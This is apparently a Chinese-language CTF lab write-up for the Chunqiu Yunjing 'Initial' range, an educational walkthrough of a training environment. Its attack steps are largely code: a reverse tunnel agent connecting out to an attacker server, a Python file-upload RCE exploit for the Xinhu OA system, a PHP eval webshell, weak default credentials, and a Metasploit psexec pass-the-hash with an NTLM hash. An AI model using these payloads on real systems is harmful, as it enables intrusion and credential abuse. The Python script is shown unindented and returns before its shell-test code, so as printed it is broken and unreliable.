---
title: 春秋云镜Initial
url: https://mp.weixin.qq.com/s/A4m7hOk4N9VtKGpNRPHdVg
source: Doonsec's feed
date: 2026-04-18
fetch_date: 2026-04-19T04:47:01.983246
---

# 春秋云镜Initial

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/A79OztZnWVmHyKg4JbN59oOEPOOxcaWYFP3sYJlIqmGV0n10IksjUcbJJe7W2iaVIMdmHpicfovYroEwYut5qK89BXNjnkQhY8G9bsuDtjfiag/0?wx_fmt=jpeg)

# 春秋云镜Initial

原创

my
my

云晞科技Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# Initial

春秋云镜靶机地址:https://yunjing.ichunqiu.com

靶机地址:39.98.109.150

先fcan扫描

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVk4B5BPJDksh5mtaNOU6O5eEV4pYvId3sD6HUtddllEBJYYxd2dtHZTEE5VIxjAFVicjmobq8iadNqChgKB67nyy36zOTEejQjvY/640?wx_fmt=png&from=appmsg)

发现开放了3个端口,和一个poc漏洞优先访问80

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVm5dF30nriamdZOpm9bN3Q4HmBpuicsYMDlbxSOKhGMWSdBPHMpvz9d77IEWxvUA51KgHQ9iauh3ia5UE6yG3kaZEIPQTjCX0r1rvQ/640?wx_fmt=png&from=appmsg)

是个网页登录界面,暂时没发现有用的,那么就直接利用php框架扫描的漏洞工具来扫一下

这里有点事,重新开了个环境:39.99.227.109

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVkM5lP6y04CZCllu63pmPribsgYyZVreTd5y2FStPoOy9O8AaThgcuR6yDgLeKMXyibJNTd7eNv5LWgN1b0BU4FodJib1j0A2xBSQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVn8CujFK7E2icHicBvfb2JNWiamasgbTdGQh3wnnCpmnVXeVMgXiakAER0JyVfmbqKODOjfroHialwFER8EXNRqPzhXy05IVU6Nul04/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVnuvJUOb6qbG5PlDJKWiaJ2pGMM6VlibdJnZZHB8tXhxJpMc09tibblwasD30A3L4Lyq6q8atvNqIuLdptk9b3nicgj3Ceibn4N0roY/640?wx_fmt=png&from=appmsg)

到https://gtfobins.org/上找mysql的sudo提权方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVmGmsVe3v00fzuFHZoWHnAN2Rhs4abKhiaa7JO0wfoak0SyzUT0mNQwEDmIFGfY8186ZDXic7nMTntn67h4ETsu5UUWnFnjUcCEs/640?wx_fmt=png&from=appmsg)

提取后直接查看root目录下,拿到flag1

# flag1

flag{60b53231-

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVmLzAgAgmAU1MW9I5icMB7UQ8V0avCa7giaR5BuFbdSyMibzgYaDkQj3Q6ZUBorTe2n9P1o2hLibxokxYGUrdOLb4lp1l941YWeDFA/640?wx_fmt=png&from=appmsg)

搭建内网代理,在有权限(/tmp)的目录下上传 linux\_x64\_agent 和 fscan

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVlYFW3BWQRUia1YfhSGad0LBOPKVPrkwOcIY1ypwuBsRFGLPQUZCC0s9XPzaKQgGup2ic1knRib2Jl8dvJvianOsT0KRBZibzc82lN8/640?wx_fmt=png&from=appmsg)

给文件执行权限

```
chmod +x /tmp/linux_x64_agent
```

打开服务端(要有公网ip的服务器)

将linux\_64\_admin 上传到服务器,并执行 文件监听端口

```
./linux_x64_admin -l 6666
```

被控端(靶机)执行脚本输入:

```
./linux_x64_agent -c 服务器(公网)ip:6666
```

服务器端已经反弹过来了,开始扫描内网

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVkPA15RjZQdcKkIOuBczwlvgjaLllEQNej90icmVfqjqhj1acwicCTk4ntb4syZs2I8aIRz0D8x66TMl26xr04ic4ny903aZSZAZU/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/A79OztZnWVkU95ictpjqhugj0CWDkcacAl6PcR8ibicmn3Rsbj2IwgTcrg9fWiab09GF22vBFAUY851rh73X9zqG7PAe2f3LuNP2UibMyL1s8p6M/640?wx_fmt=jpeg&from=appmsg)

开启proxifier或者其他代理软件![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVmOdFo3ibXTSUA2NNLS256IgSk40o1ESaXYnRueN2XmnpFniaOxHYaPRpeoXqAiaKvjicQQzkvrPTQd2AWvlFLibUQVJeoez1BDpeicQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVlicU1YnDTHThmNEpOojWU0U8h2plNictkkbatFLHy8n35IGgmUBnyC2EzaSLZicW1qL96P6V3fT04qCNR0dMPYUYcFEoZ0ib6sXeE/640?wx_fmt=png&from=appmsg)

也是可以访问到这个网页了

# flag2

尝试了下常用的弱口令直接进去了
账户:admin
密码:admin123

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVn57GLp3pbJpL6QsRJ3kfNn7CjCtUq6npz4icpCibLia8qbCBtEXrW4zzLxLsF3MTxVHkraAm7WcfBYsiav8rEqKR8CSicAgC31MlAU/640?wx_fmt=png&from=appmsg)

网上直接搜到了一篇这个系统的rce漏洞

登录后就是 web 手的事情了，这个系统存在文件上传漏洞，有直接的 poc

```
import requests
import sys

def main():
target = "http://172.22.1.18"
shell_file = "1.php"

session = requests.Session()

login_url = f"{target}/?a=check&m=login&d=&ajaxbool=true&rnd=533953"
login_data = {
'rempass': '0',
'jmpass': 'false',
'device': '1625884034525',
'ltype': '0',
'adminuser': 'YWRtaW4=',
'adminpass': 'YWRtaW4xMjM=',
'yanzm': ''
}

try:
print("[*] 正在登录...")
r = session.post(login_url, data=login_data, timeout=10)
r.raise_for_status()
except requests.exceptions.RequestException as e:
print(f"[-] 登录失败: {e}")
return

upload_url = f"{target}/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913"

try:
print(f"[*] 正在上传 {shell_file}...")
with open(shell_file, 'rb') as f:
files = {'file': f}
r = session.post(upload_url, files=files, timeout=10)
r.raise_for_status()

upload_result = r.json()
filepath = "/" + upload_result['filepath'].split('.uptemp')[0] + '.php'
fileid = upload_result['id']
print(f"[+] 上传成功! 文件ID: {fileid}, 路径: {filepath}")
return

task_url = f"{target}/task.php?m=qcloudCos|runt&a=run&fileid={fileid}"
shell_url = f"{target}{filepath}"

try:
print(f"[*] 正在测试Shell: {shell_url}")
r = session.get(shell_url, params={'1': "system('dir');"}, timeout=10)
print("n" + "="*50)
print(r.text)
print("="*50 + "n")
print("[+] 交互完成! 可手动访问Shell地址继续操作")

except requests.exceptions.RequestException as e:
print(f"[-] Shell连接失败: {e}")

if __name__ == "__main__":
main()
```

相同目录下还有一个 1.php 文件存的是一句话木马

```
<?php @eval($_POST["shell"]);?>
```

手动访问一下上传的php,让服务器解析一下,然后webshell连接
![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVkJfIwjB9G0GM1O0P37WLy0zQG06zia9Iiba37R6PrpsEickW3dnJdicP1eLdpCiaGRHlKPfOOnOnQFOic0675k2JbhBn9v40jTS2t8k/640?wx_fmt=png&from=appmsg)

是system权限的用户,直接拿flag

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVkI0GJvsouwn0SGkOcGHROQLHtyb7ALRiaSgtuFnPVzLhN9A9MOYjb9V4wg814T6UrOQX2mA91MTYqhuQ9GJ9B4BnJSvEd6YrT4/640?wx_fmt=png&from=appmsg)

拿到第二段flag:
2ce3-4813-87d4-

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVm5AchXQqKcCVVuuAZ55kZ6KNe4r5a38haTyhGmywn0ZW0Sx7ROJ1yxDLO2oY1icwWUNibHmyVVBudiaVyibIjtQraibxficN6h5yPkE/640?wx_fmt=png&from=appmsg)
> ❝
>
> 172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1 flag1 拿下
> 172.22.1.2 DC:DC01.xiaorang.lab
> 172.22.1.18 信呼协同办公系统 flag2 拿下
> 172.22.1.21 MS17-010

# flag3

接下来尝试拿flag3,直接msfconsole
windows 下载地址:https://windows.metasploit.com/

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVmibSew8c1EbibLG1QIoUG1XqOc253AbTTHGqaxUdZZDHYQAhCPgeGp7dXCfmcorYJ3XmIBRAORXkjKQFgnIRUwib1koTZsKDDCB0/640?wx_fmt=png&from=appmsg)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVmdIFgTpXicgZ71jp8FhCVG83k4UWlibTw2B6T2NPa0Amb3du9pI2Fr0YQxQFS5K4ia42yxB5Mca8DNcCL7eppSQbLiaO2jvqI8odk/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVmSw58EP8BXuiaCOqjhriavtojA2dsDIwyRX0zsiayLKGfIehUianmqugAAziayPvAJ6MPuAZc4AqZCVQ5hIEmicIiaOS7fK39A4d0w2I/640?wx_fmt=png&from=appmsg)

```
use exploit/windows/smb/psexec

set RHOSTS 172.22.1.2

# 设置SMB认证使用的用户名
set SMBUser Administrator

#设置SMB认证的凭证，这里使用哈希传递攻击的标准格式：[LM哈希]:[NTLM哈希]
# 前半段 aad3b435b51404eeaad3b435b51404ee 是现代Windows系统默认的无效/空LM哈希固定占位符
# 后半段 10cf89a850fb1cdbe6bb432b859164c8 是目标管理员账户的NTLM哈希，无需明文密码即可完成认证
set SMBPass aad3b435b51404eeaad3b435b51404ee:10cf89a850fb1cdbe6bb432b859164c8

# 设置目标主机所属的Windows域名称，指定本次认证的域环境为xiaorang.lab
set SMBDomain xiaorang.lab

set PAYLOAD windows/x64/meterpreter/bind_tcp

exploit
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVnO1RzjzP2wJMmF4dYOFH1gEh0lUiaMFzzFgKkaNV8bPOhicShPS4ymMOr44mkEWpsob0icSSETWc9qzXq8otqXNYibA6KuzCrN2TI/640?wx_fmt=png&from=appmsg)

# 拿到完整flag

flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNOexrWpDgDYXpYTLbLrl7RhtCuwTAdmvLKiaF0kN9rgKnvsq0GYhnCY3w34I63n5U9ocibeG87eFCqg/0?wx_fmt=png)

云晞科技Sec

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNOexrWpDgDYXpYTLbLrl7RhtCuwTAdmvLKiaF0kN9rgKnvsq0GYhnCY3w34I63n5U9ocibeG87eFCqg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过